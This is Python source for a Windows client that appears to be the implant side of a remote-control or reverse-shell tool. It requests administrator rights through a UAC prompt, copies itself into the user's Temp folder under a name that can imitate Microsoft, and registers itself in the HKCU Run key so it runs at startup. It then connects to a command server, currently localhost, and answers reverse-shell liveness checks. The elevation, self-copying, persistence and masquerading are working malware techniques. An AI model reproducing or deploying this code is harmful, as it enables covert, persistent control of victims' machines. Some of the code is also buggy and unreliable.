import socket
from colorama import Back, Style, Fore
import shutil
import sys
import subprocess
import os
import time
import winreg as reg
import ctypes

# Define the server IP and port
SERVER_IP = "127.0.0.1"
SERVER_PORT = 5050

def run_as_admin():
    # Prompt the user to run the script as administrator
    message = "This program needs administrative privileges to run properly.\n" \
"Do you want to run it as administrator?"
    title = "Administrator Privileges Required"
    response = ctypes.windll.user32.MessageBoxW(None, message, title, 4 | 48)  # 4 for Yes/No buttons, 48 for Warning icon

    if response == 6:  # 6 is the return value for "Yes" button
        # If the user chooses "Yes," re-run the script as administrator
        params = ' '.join(['"{}"'.format(arg) for arg in sys.argv])  # Get the command-line arguments
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)

        # Terminate the current script as it's running without admin privileges
        sys.exit(0)

def check_admin_privileges():
    # Check if the script is running with administrator privileges
    if not ctypes.windll.shell32.IsUserAnAdmin():
        run_as_admin()

def connect_to_server():
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))
        connection_flag = "REGULAR_CLIENT_FLAGS"
        client_socket.send(connection_flag.encode('utf-8'))
        while True:
            # Receive the command from the server
                print("COMMAND")
                command = client_socket.recv(4096).decode("utf-8")
                print(f"{Fore.GREEN}{command}{Style.RESET_ALL}")

                if command == "REVERSE_SHELL_THREAD=ISALIVE?":
                    client_socket.send("REVERSE_SHELL_THREAD=ISALIVE?TRUE".encode("utf-8"))
    except:
        print("Rtrying...")
        time.sleep(5)
        connect_to_server()

def duplicate_script_to_specific_location(destination_folder):
    # Get the filename of the current script
    script_filename = os.path.basename(sys.argv[0])

    # Build the full path of the destination location
    destination_path = os.path.join(destination_folder, script_filename)

    # Check if the destination file already exists
    if os.path.exists(destination_path):
        # Generate a new name for the duplicated file (you can use any method you prefer)
        new_name = os.path.splitext("MicrosoftCorporation") + os.path.splitext(script_filename)[1]
        destination_path = os.path.join(destination_folder, new_name)

    # Duplicate the script to the specified location
    shutil.copy(sys.argv[0], destination_path)

    print(f"File duplicated to: {destination_path}")

    # Run the duplicated script
    subprocess.Popen([sys.executable, destination_path])

def check_and_duplicate_script():
    check_admin_privileges()
    time.sleep(5)
    # Get the username dynamically
    username = os.path.expanduser("~")

    # Construct the destination folder with the username
    destination_folder = os.path.join(username, "AppData",  "Local", "Temp")

    # Check if the executable already exists in the destination folder
    script_filename = "_duplicated.exe"
    destination_path = os.path.join(destination_folder, script_filename)

    if not os.path.exists(destination_path):
        # Duplicate the script to the specified location
        duplicate_script_to_specific_location(destination_folder)
        add_registry_entry_for_startup(destination_path)

    else:
        print(f"Executable '{script_filename}' already exists in the destination folder.")
        print("Connect to server")
        add_registry_entry_for_startup(destination_path)
        connect_to_server()

def add_registry_entry_for_startup(script_path):
    try:
        # Open the registry key for the current user's startup programs
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_handle = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)

        # Set the registry value to run the script on startup
        script_filename = os.path.splitext(os.path.basename(sys.argv[0]))[0]  # Get the script filename without extension
        reg.SetValueEx(key_handle, script_filename, 0, reg.REG_SZ, script_path)
        print("Key added..")

        # Close the registry key
        reg.CloseKey(key_handle)
    except Exception as e:
        print(f"Error adding registry entry: {e}")

if __name__ == "__main__":
    connect_to_server()
